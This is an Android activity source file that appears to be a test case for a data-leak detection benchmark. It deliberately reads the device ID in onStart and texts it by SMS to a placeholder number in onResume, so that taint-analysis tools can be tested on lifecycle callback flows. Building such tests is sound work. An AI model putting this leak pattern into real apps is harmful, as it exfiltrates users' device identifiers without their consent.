package edu.uta;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name lifecycle_ActivityEventSequence1
 * 
 * @description   Testing if information leak is detected based on valid flows between the activity callbacks. 
 * @dataflow onStart: source -> onResume: sink
 * @number_of_leaks 1
 * @challenges  The analysis tool must be able to incorporate only those callback flows which can occur in real Android apps. onRestoreInstanceState() callback is not invoked in all cases. 
 * 
 */
public class ActivityEventSequence1 extends Activity {

	private String d1 = "";
	private String recpNo = "5556";

	@Override
	public void onCreate(Bundle instance){
		super.onCreate(instance);

		setContentView(R.layout.activity_main);
	}

	@Override 
	public void onStart()
	{
		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		this.d1 = tMgr.getDeviceId();
		super.onStart();
	}
	

	@Override 
	public void onRestoreInstanceState(Bundle state)
	{
		this.d1 = "";
		super.onRestoreInstanceState(state);
	}
	
	@Override
	public void onResume()
	{
		SmsManager.getDefault().sendTextMessage(recpNo, null, d1, null, null);
		super.onResume();
	}
	
}